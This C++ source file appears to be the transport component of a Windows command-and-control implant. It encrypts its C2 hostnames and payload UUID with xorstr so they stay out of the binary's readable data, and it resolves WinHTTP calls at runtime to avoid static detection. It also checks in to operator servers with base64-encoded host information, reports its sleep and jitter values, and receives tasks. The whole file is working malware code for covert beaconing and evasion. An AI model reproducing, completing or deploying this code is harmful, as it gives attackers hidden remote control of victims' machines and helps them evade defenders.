// ========================================== { START OF FILE } ========================================== //

#include "agent/transport/comm_manager.h"
#include "agent/util/api_resolver.h"
#include "agent/runtime/schedule.h"
#include "agent/util/trace.h"

#include <string>
#include <vector>
#include <sstream>

#ifdef _WIN32
#include <windows.h>
#include <winhttp.h>
#endif

#include "xorstr/xorstr.hpp"
#include "base64.hpp"

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// Adapted from Agent.RefactorExample/ to use Agent/ compile-time definitions:
//   COMM_HOSTS_LIST, COMM_PAYLOAD_UUID, COMM_PORT, COMM_USER_AGENT
//   instead of HOST, PAYLOAD_UUID, AUTH_TOKEN.
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//

namespace {

    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
    // Convert a C string to std::wstring
    [[nodiscard]] std::wstring ToWideString(const char* str) {
        std::wstring result;
        for (int i = 0; str[i] != '\0'; i++) {
            result.push_back(static_cast<wchar_t>(str[i]));
        }
        return result;
    }

#ifdef _WIN32
#if defined(AGENT_TRACE)
    // TraceStatus is only compiled into a traced build, so the call sites stay readable.
#define TRACE_HTTP_STATUS(request, module) TraceStatus(request, module)
    /// WinHttpQueryStatusCode does not exist: the status code comes from WinHttpQueryHeaders with
    /// WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER (see .pi/notes/win32-traps.md).
    void TraceStatus(HINTERNET request, HMODULE winhttp) {
        const auto query_headers =
            agent::util::resolve_api<decltype(&WinHttpQueryHeaders)>(winhttp, xorstr_("WinHttpQueryHeaders"));
        DWORD status = 0;
        DWORD size = sizeof(status);
        if (query_headers != nullptr &&
            query_headers(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX,
                          &status, &size, WINHTTP_NO_HEADER_INDEX)) {
            agent::util::trace::EmitCode(xorstr_("winhttp"), xorstr_("status"), status);
            return;
        }
        AGENT_TRACE_LAST_ERROR(xorstr_("winhttp"), xorstr_("status query failed"));
    }
#else
#define TRACE_HTTP_STATUS(request, module) ((void)0)
#endif
#endif  // _WIN32

#ifdef _WIN32
    /// Performs a WinHttp POST to `url` with `body` and returns the response.
    std::string HttpPost(const std::string& url, const std::string& body) {
        std::string response;
        const HMODULE winhttp = agent::util::get_module(xorstr_("winhttp.dll"));
        const auto winhttp_open = agent::util::resolve_api<decltype(&WinHttpOpen)>(winhttp, xorstr_("WinHttpOpen"));
        const auto winhttp_crack_url =
            agent::util::resolve_api<decltype(&WinHttpCrackUrl)>(winhttp, xorstr_("WinHttpCrackUrl"));
        const auto winhttp_close_handle =
            agent::util::resolve_api<decltype(&WinHttpCloseHandle)>(winhttp, xorstr_("WinHttpCloseHandle"));
        const auto winhttp_connect =
            agent::util::resolve_api<decltype(&WinHttpConnect)>(winhttp, xorstr_("WinHttpConnect"));
        const auto winhttp_open_request =
            agent::util::resolve_api<decltype(&WinHttpOpenRequest)>(winhttp, xorstr_("WinHttpOpenRequest"));
        const auto winhttp_send_request =
            agent::util::resolve_api<decltype(&WinHttpSendRequest)>(winhttp, xorstr_("WinHttpSendRequest"));
        const auto winhttp_receive_response =
            agent::util::resolve_api<decltype(&WinHttpReceiveResponse)>(winhttp, xorstr_("WinHttpReceiveResponse"));
        const auto winhttp_query_data_available = agent::util::resolve_api<decltype(&WinHttpQueryDataAvailable)>(
            winhttp, xorstr_("WinHttpQueryDataAvailable"));
        const auto winhttp_read_data =
            agent::util::resolve_api<decltype(&WinHttpReadData)>(winhttp, xorstr_("WinHttpReadData"));
        HINTERNET hSession =
            winhttp_open(ToWideString(xorstr_(COMM_USER_AGENT)).c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (hSession == nullptr) {
            AGENT_TRACE_LAST_ERROR(xorstr_("http"), xorstr_("open_session"));
            return response;
        }

        // Parse URL. WinHttpCrackUrl only fills the components whose *Length member is set to
        // (DWORD)-1 on input; the returned pointers are substrings of wurl and are NOT
        // null-terminated, so each one is copied out with its reported length.
        URL_COMPONENTS uc{};
        uc.dwStructSize = sizeof(uc);
        uc.dwSchemeLength = static_cast<DWORD>(-1);
        uc.dwHostNameLength = static_cast<DWORD>(-1);
        uc.dwUrlPathLength = static_cast<DWORD>(-1);

        const std::wstring wurl(url.begin(), url.end());
        if (!winhttp_crack_url(wurl.c_str(), 0, 0, &uc)) {
            AGENT_TRACE_LAST_ERROR(xorstr_("http"), xorstr_("crack_url"));
            winhttp_close_handle(hSession);
            return response;
        }

        const std::wstring host_name(uc.lpszHostName, uc.dwHostNameLength);
        HINTERNET hConnect = winhttp_connect(hSession, host_name.c_str(), uc.nPort,
                                             uc.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
        if (hConnect == nullptr) {
            AGENT_TRACE_LAST_ERROR(xorstr_("http"), xorstr_("connect"));
            winhttp_close_handle(hSession);
            return response;
        }

        const std::wstring url_path(uc.lpszUrlPath, uc.dwUrlPathLength);
        HINTERNET hRequest = winhttp_open_request(hConnect, L"POST", url_path.c_str(), nullptr, WINHTTP_NO_REFERER,
                                                  WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (hRequest == nullptr) {
            AGENT_TRACE_LAST_ERROR(xorstr_("http"), xorstr_("open_request"));
            winhttp_close_handle(hConnect);
            winhttp_close_handle(hSession);
            return response;
        }

        const auto contentLength = static_cast<DWORD>(body.size());
        // WinHttpSendRequest takes a non-const LPVOID; the buffer is not mutated.
        auto* const bodyPtr = static_cast<LPVOID>(const_cast<char*>(body.data()));  // NOLINT

        // NOTE: the interval used to be sent as extra request headers. WinHTTP dropped the block
        // silently with the -1 sentinel, and an explicit length made the whole POST fail (the agent
        // then never checked in at all). Header semantics are not worth the risk for two integers:
        // the check-in URL carries them as query parameters instead (see Checkin/InitialCheckin),
        // which is plain string building on both ends.
        BOOL success = winhttp_send_request(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, bodyPtr, contentLength,
                                            contentLength, 0);

        if (!success) {
            AGENT_TRACE_LAST_ERROR(xorstr_("http"), xorstr_("send_request"));
            TRACE_HTTP_STATUS(hRequest, winhttp);
        }
        if (success) {
            success = winhttp_receive_response(hRequest, nullptr);
            if (!success) {
                AGENT_TRACE_LAST_ERROR(xorstr_("http"), xorstr_("receive_response"));
            }
            if (success) {
                TRACE_HTTP_STATUS(hRequest, winhttp);
                DWORD bytesAvailable = 0;
                while (winhttp_query_data_available(hRequest, &bytesAvailable) && bytesAvailable > 0) {
                    std::string chunk(bytesAvailable, '\0');
                    DWORD bytesRead = 0;
                    if (winhttp_read_data(hRequest, chunk.data(), bytesAvailable, &bytesRead)) {
                        chunk.resize(bytesRead);
                        response += chunk;
                    } else {
                        AGENT_TRACE_LAST_ERROR(xorstr_("http"), xorstr_("read_data"));
                    }
                    if (bytesRead == 0) break;
                }
            }
        }

        // Close handles
        winhttp_close_handle(hRequest);
        winhttp_close_handle(hConnect);
        winhttp_close_handle(hSession);

        AGENT_TRACE_LOG(xorstr_("http"), xorstr_(" bytes="), response.size());
        return response;
    }
#endif  // _WIN32

}  // namespace

namespace agent::transport {

    namespace {
        /// Session identifier issued by the server at check-in; empty until it completes.
        std::string g_session_uuid;
    }  // namespace

    std::string CurrentSessionUuid() { return g_session_uuid; }

    namespace {
        /// Process-wide host list; CommManager used to own a copy, which a command could not reach.
        std::vector<std::string>& HostList() {
            static std::vector<std::string> hosts;
            return hosts;
        }
    }  // namespace

    std::vector<std::string> Hosts() { return HostList(); }

    void SetHosts(std::vector<std::string> hosts) { HostList() = std::move(hosts); }

    CommManager::CommManager() {
        // COMM_* values arrive as command-line -D macros, so they are not visible to
        // xorstr.py. Encrypt them here so the payload UUID / C2 hosts never land in .rdata.
        payload_uuid = xorstr_(COMM_PAYLOAD_UUID);

        // COMM_HOSTS_LIST is a regular string with semicolon-separated hosts
        // e.g. "localhost;backup.example.com"
        std::string hosts_str = xorstr_(COMM_HOSTS_LIST);

        // Split on semicolons
        size_t pos = 0;
        while ((pos = hosts_str.find(';')) != std::string::npos) {
            std::string host = hosts_str.substr(0, pos);
            HostList().push_back(host);
            hosts_str = hosts_str.substr(pos + 1);
        }

        // Add the last host
        if (!hosts_str.empty()) {
            HostList().push_back(hosts_str);
        }

        // Use the first host for the base URL (legacy behavior)
    }

    std::string CommManager::Checkin(const std::string& json) {
#ifdef _WIN32
        // Build the checkin request: UUID prefix + results JSON, base64 encoded.
        // The server expects base64(uuid + json) where uuid is the payload UUID for the very
        // first checkin and the server-issued CheckIn UUID for every later one.
        const std::string& session = uuid.empty() ? payload_uuid : uuid;
        const std::string body = base64::to_base64(session + json);

        // Use the first host for the base URL; an empty list cannot happen (the constructor seeds
        // at least COMM_HOSTS_LIST) but a command may have replaced it.
        const std::vector<std::string> current = Hosts();
        if (current.empty()) {
            // Checkin returns the decoded response; no hosts means no call to make.
            return {};
        }
        std::string host_str = current.front();

        std::ostringstream port_stream;
        port_stream << COMM_PORT;
        std::string base_url = xorstr_("http://") + host_str + ":" + port_stream.str();

        // Post and decode the response
        // Two integers the operator's view depends on: the interval the agent is actually running at.
        const auto sleep_ms = agent::runtime::Schedule::Instance().SleepMs();
        const auto jitter = agent::runtime::Schedule::Instance().JitterPercent();
        const std::string url = base_url + xorstr_("/api/v1/agents/checkin?sleep=") + std::to_string(sleep_ms) +
                                xorstr_("&jitter=") + std::to_string(jitter);
        AGENT_TRACE_LOG(xorstr_("checkin"), " url=", url, " body=", body.size());
        std::string response = HttpPost(url, body);

        if (!response.empty()) {
            std::string decoded = base64::from_base64(response);
            // The task/response blob is prefixed with the session UUID; strip it.
            if (!decoded.empty() && decoded.compare(0, session.size(), session) == 0) {
                decoded = decoded.substr(session.size());
            }
            g_session_uuid = uuid;
            return decoded;
        }

        return {};
#else
        (void)json;
        return {};
#endif
    }

    void CommManager::InitialCheckin(const std::string& json) {
#ifdef _WIN32
        // Initial checkin: base64(payload UUID + host info JSON).
        const std::string body = base64::to_base64(payload_uuid + json);

        // Use the first host for the base URL; an empty list cannot happen (the constructor seeds
        // at least COMM_HOSTS_LIST) but a command may have replaced it.
        const std::vector<std::string> current = Hosts();
        if (current.empty()) {
            return;  // nothing to report; the agent loop will retry
        }
        std::string host_str = current.front();

        std::ostringstream port_stream;
        port_stream << COMM_PORT;
        std::string base_url = xorstr_("http://") + host_str + ":" + port_stream.str();

        // Two integers the operator's view depends on: the interval the agent is actually running at.
        const auto sleep_ms = agent::runtime::Schedule::Instance().SleepMs();
        const auto jitter = agent::runtime::Schedule::Instance().JitterPercent();
        const std::string url = base_url + xorstr_("/api/v1/agents/checkin?sleep=") + std::to_string(sleep_ms) +
                                xorstr_("&jitter=") + std::to_string(jitter);
        AGENT_TRACE_LOG(xorstr_("checkin"), " url=", url, " body=", body.size());
        std::string response = HttpPost(url, body);

        // The server responds with the callback UUID (base64 encoded)
        if (!response.empty()) {
            std::string decoded = base64::from_base64(response);
            uuid = decoded;
            g_session_uuid = uuid;
            AGENT_TRACE_LOG(xorstr_("checkin"), xorstr_(" session="), uuid);
        } else {
            AGENT_TRACE_LOG(xorstr_("checkin"), xorstr_(" no_response"));
        }
#else
        (void)json;
#endif
    }

}  // namespace agent::transport
// ========================================== { END OF FILE } ========================================== //
